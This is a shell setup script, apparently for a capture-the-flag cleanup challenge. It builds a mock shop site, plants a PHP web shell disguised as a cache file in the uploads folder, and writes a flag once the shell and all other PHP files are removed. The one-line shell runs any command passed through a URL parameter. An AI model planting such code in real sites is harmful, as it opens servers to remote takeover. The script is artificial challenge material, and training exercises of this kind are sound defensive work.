#!/bin/sh
set -e
FLAG_VALUE="${FLAG:-MISSING_FLAG}"
SITE=/var/www/site

mkdir -p "$SITE/assets" "$SITE/uploads"
echo '<html><body>Главная страница магазина</body></html>' > "$SITE/index.html"
echo 'body { color: #333; }' > "$SITE/assets/style.css"
echo 'ok' > "$SITE/uploads/receipt-4471.jpg"

cat > "$SITE/uploads/wp-cache-x9f.php" <<'PHP'
<?php
// planted webshell: accepts a command via ?c= and executes it
if (isset($_GET['c'])) { system($_GET['c']); }
PHP

mkdir -p /root
(
  set +e
  while true; do
    sleep 1
    if [ ! -e "$SITE/uploads/wp-cache-x9f.php" ] && ! find "$SITE" -iname '*.php' 2>/dev/null | grep -q .; then
      echo "$FLAG_VALUE" > /root/flag.txt
    fi
  done
) &

tail -f /dev/null
